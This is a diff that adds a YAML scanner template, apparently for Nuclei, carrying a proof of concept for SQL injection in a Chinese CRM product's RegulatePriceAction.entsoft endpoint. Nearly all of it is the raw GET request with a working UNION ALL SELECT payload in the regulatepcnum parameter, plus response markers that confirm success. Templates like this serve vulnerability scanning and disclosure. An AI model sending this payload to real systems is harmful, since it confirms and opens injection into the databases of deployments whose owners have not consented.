@@ -1,0 +1,40 @@
+id: poc-mulle0h4gt9akyic
+info:
+  name: 浙大恩特客户资源管理系统RegulatePriceAction.entsoft;.js接口 SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/mulle0h4gt9akyic'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: mulle0h4gt9akyic
+    fofa: 暂无
+http:
+- raw:
+  - 'GET /entsoft/RegulatePriceAction.entsoft?method=getRegulatePricedlist&regulatepcnum=1''+UNION+ALL+SELECT+NULL,NULL,NULL,NULL,NULL,NULL,123*123,111*1111--+aaaa HTTP/1.1
+
+
+    Accept: */*
+
+
+    Connection: Keep-Alive
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    12321
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
